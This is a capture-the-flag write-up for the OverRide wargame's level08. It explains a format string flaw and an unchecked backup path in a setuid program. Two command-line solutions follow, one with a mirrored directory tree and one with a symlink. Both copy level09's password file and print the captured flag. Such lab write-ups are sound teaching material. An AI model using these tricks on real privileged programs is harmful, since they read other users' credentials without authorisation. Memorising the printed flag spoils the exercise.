# level08

## Header

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level08/level08
```

<hr>

## Analysis

From the [disassembled binary](./source.s) and the [source](./source.c) code we can see that program tries to create a copy of the file, provided as the first argument and store it in `./backups/` folder.

Here are the important things that source code analysis gives:

`log_wrapper` function is vulnerable to `format string attack`:
```c
void log_wrapper(FILE *file, char *src, char *format) {
    ...
    snprintf(buf, 254 - strlen(buf), format, strlen(buf));
    ...
}

int main(int ac, char **av) {
    ...
    log_wrapper(log, "Starting back up: ", av[1]);
    ...
}
```
I decided not to perform it, as `Full RELRO` is in this level meaning that `GOT` cannot be overwritten.
`NX disabled` meaning that program is 'opened' to shellcode injections, but there's a way more simple solution for this level.

Source file is opened by the filepath given in `argv`, whereas destination (copy) first catenates filepath from `argv` with
`./backups/` and then opens file. <br> 
```c
    // src
    file = fopen(av[1], "r");       
    ...
    // dst
    strcpy(filepath, "./backups/"); 
    strncat(filepath, av[1], 99 - strlen(filepath));
    fd = open(filepath, O_CREAT | O_EXCL | O_WRONLY, 0600); 
```

One more important thing is destination file opened with `O_EXCL`(read the spoiler to know about open flags). <br>
This means that `open` will fail if the file already exist.

<details>
<summary>Understanding open attributes</summary>

You can find open attributes `0xc1` and `0x1b0` in this file:
```bash
    level08@OverRide:~$ nano /usr/include/x86_64-linux-gnu/bits/fcntl.h
```
</details>

The last rule makes impossible to pass the path like this:
```bash
level08@OverRide:~$ ./level08 ../../../../../home/users/level09/.pass
ERROR: Failed to open ./backups/../../../../../home/users/level09/.pass
```

## Solution 1

```bash
# /tmp is a directory with write access
level08@OverRide:~$ cd /tmp

# create the same directory structure as absolute path to level09 
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09

# run with path and get the key!
level08@OverRide:/tmp$ /home/users/level08/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cd backups/home/users/level09/
level08@OverRide:/tmp/backups/home/users/level09$ cat .pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

## Solution 2

If we try to create symbolic link, we'll get permission denied error: 
```bash
level08@OverRide:~$ ln -s ../level09/.pass secret
ln: accessing `secret': Permission denied
```

The reason is current folder lacks of write rights:
```bash
level08@OverRide:~$ ll
total 28
dr-xr-x---+ 1 level08 level08   100 Oct 19  2016 ./
...
```

But we're in the home directory! So, let's fight this inequity:
```bash
level08@OverRide:~$ chmod +w .
level08@OverRide:~$ ll
total 28
drwxrwx---+ 1 level08 level08   100 Oct 19  2016 ./
...
```

Great! Now we can simply create symbolic link to the `.pass`:
```bash
level08@OverRide:~$ ln -s ../level09/.pass secret
level08@OverRide:~$ ./level08 secret 
level08@OverRide:~$ cat backups/secret
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

## References
- [man open](https://man7.org/linux/man-pages/man2/open.2.html)
- [There are some info about RELRO](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html) (Do not need here, but this level has Full RELRO, so it is good to know about it)
